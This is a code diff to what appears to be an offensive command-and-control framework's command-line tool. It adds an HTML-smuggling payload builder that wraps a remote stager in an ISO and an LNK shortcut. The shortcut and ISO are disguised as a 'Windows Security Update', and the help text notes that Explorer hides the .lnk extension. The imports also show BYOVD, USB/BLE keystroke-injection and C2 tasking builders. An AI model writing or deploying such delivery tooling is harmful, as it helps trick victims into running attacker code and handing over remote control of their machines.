@@ -33,7 +33,8 @@ from builders.stager  import generate_stager, generate_escalation_chain_params
 from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
 from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
-from builders.blehid  import build_ble_payload, DEVICES as BLE_DEVICES
+from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES
+from builders.smuggle  import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES
 from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result
 
 
@@ -393,10 +394,34 @@ def cmd_build(args, cfg, ws):
         build_ble_payload(stager_url, ble_out, device=ble_dev, ble_name=ble_name)
         did_something = True
 
+    # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
+    if getattr(args, "smuggle", None) is not None:
+        tname = args.smuggle or "__c2_agent__"
+        stager_name = ws._load_manifest().get(f"stager_{tname}")
+        if not stager_name:
+            hint = "lilith build --c2-stager" if tname == "__c2_agent__" else f"lilith build --stager {tname}"
+            print(f"[!] No stager found for '{tname}' — run: {hint}")
+            sys.exit(1)
+        scheme     = "https"
+        url_prefix = cfg.get("url_prefix", "/cdn/static/v3")
+        stager_url = f"{scheme}://{lhost}:{port}{url_prefix}/{stager_name}"
+        smuggle_out  = getattr(args, "smuggle_out",  None) or ws.directory
+        smuggle_lure = getattr(args, "smuggle_lure", "update")
+        smuggle_lnk  = getattr(args, "smuggle_lnk",  "Windows Security Update")
+        smuggle_iso  = getattr(args, "smuggle_iso",  "WindowsSecurityUpdate.iso")
+        build_smuggle_payload(
+            stager_url, smuggle_out,
+            lure     = smuggle_lure,
+            lnk_name = smuggle_lnk,
+            iso_name = smuggle_iso,
+        )
+        did_something = True
+
     if not did_something:
         print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
-        print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL, or --ble TOOL")
+        print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
+        print("    --ble TOOL, or --smuggle [TOOL]")
 
 
 def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
@@ -852,6 +877,17 @@ def main():
                          help="Output directory for BLE sketch folder (default: <workspace>/ble/)")
     build_p.add_argument("--ble-name",       metavar="NAME",  dest="ble_name",   default="Apple Wireless Keyboard",
                          help="BLE device name shown on target pairing dialog (default: 'Apple Wireless Keyboard')")
+    build_p.add_argument("--smuggle",        metavar="TOOL",  dest="smuggle", nargs="?", const="__c2_agent__",
+                         help="HTML smuggling → ISO → LNK (tool name, or bare --smuggle for C2 agent stager)")
+    build_p.add_argument("--smuggle-lure",   metavar="THEME", dest="smuggle_lure", default="update",
+                         choices=list(SMUGGLE_LURES),
+                         help="Lure theme: " + " | ".join(SMUGGLE_LURES) + "  (default: update)")
+    build_p.add_argument("--smuggle-lnk",    metavar="NAME",  dest="smuggle_lnk",  default="Windows Security Update",
+                         help="LNK display name inside ISO (no extension — .lnk hidden by Explorer)")
+    build_p.add_argument("--smuggle-iso",    metavar="NAME",  dest="smuggle_iso",  default="WindowsSecurityUpdate.iso",
+                         help="ISO filename in browser download bar (default: WindowsSecurityUpdate.iso)")
+    build_p.add_argument("--smuggle-out",    metavar="DIR",   dest="smuggle_out",  default=None,
+                         help="Output directory (default: workspace root)")
 
     serve_p = sub.add_parser("serve", help="Start HTTPS server + callback listener")
     serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
